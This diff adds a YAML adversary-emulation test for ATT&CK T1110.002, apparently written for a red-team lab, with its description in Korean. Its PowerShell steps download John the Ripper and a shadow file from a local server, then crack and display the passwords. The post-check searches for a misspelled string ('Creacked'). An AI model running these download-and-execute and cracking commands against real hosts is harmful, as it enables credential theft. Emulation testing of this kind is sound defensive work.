@@ -1,0 +1,78 @@
+attack_technique: T1110.002
+display_name: 'Brute Force: Password Cracking'
+category:
+    - Credential Access
+progress: Complete
+atomic_tests:
+    - name: Password Cracking with john
+      description: |
+        English : password cracking
+
+        Korean : 
+        John을 사용하여 shadow Cracking하는 기법
+
+         - Execute : John the ripper 사용하여 shadow Cracking
+         - Pre :  필요 없음
+         - Input : john url, shadow 파일 url, shadow 파일이 저장될 경로
+         - dependencies : John 확인 및 설치
+         - Output : 크랙킹된 패스워드
+         - Post : 크랙킹된 패스워드 존재
+
+      supported_platforms:
+        - windows
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments:
+        johndumpDownloadUrl:
+            description: john program url
+            type: Url
+            default: 'http://127.0.0.1:8080/T1110.002/john-1.9.0-jumbo-1-win64.zip'
+        shadowfileUrl:
+            description: shadow file url
+            type: Url
+            default: 'http://127.0.0.1:8080/T1110.002/alpinelab_shadow.txt'
+        shadowfile:
+            description: Path where results will be placed
+            type: Path
+            default: '$env:TEMP\T1110.002\T1110.002@2_enc.txt'
+      dependency_executor_name: powershell
+      dependencies:
+        - description: |
+            john must exist on disk 
+          prereq_command: |
+            if (Test-Path "$env:TEMP\T1110.002\john") {exit 0} else {exit 1}
+          get_prereq_command: |
+            New-Item -ItemType Directory $env:TEMP\T1110.002 -Force | Out-Null
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            Invoke-WebRequest "#{johndumpDownloadUrl}" -OutFile "$env:TEMP\T1110.002\john.zip"
+            Expand-Archive $env:TEMP\T1110.002\john.zip $env:TEMP\T1110.002\john -Force
+      executor:
+        name: powershell
+        command: |
+            cd $env:TEMP\T1110.002\john\run
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            Invoke-WebRequest "#{shadowfileUrl}" -OutFile "#{shadowfile}"
+            .\john.exe "#{shadowfile}"
+            .\john.exe "#{shadowfile}" --show
+      output:
+        output_executor_name: powershell
+        command: |
+            .\john.exe "#{shadowfile}" --show
+      post:
+        post_executor_name: powershell
+        command: |
+            $result = type $env:TEMP\T1110.002\john\run\john.log
+            echo $result | findstr Creacked
+            if ( $result ) {exit 0} else { exit 1}
+      technique_remote: False
+      dest:
+        pre_state:
+          - Compromised : True
+          - OS_type : Windows
+          - OS_status : Running
+          - Password : True
+          - Password_s : Dumped or Received
+          - Password_a : Read
+        post_state:
+          - Password_s : Cracked
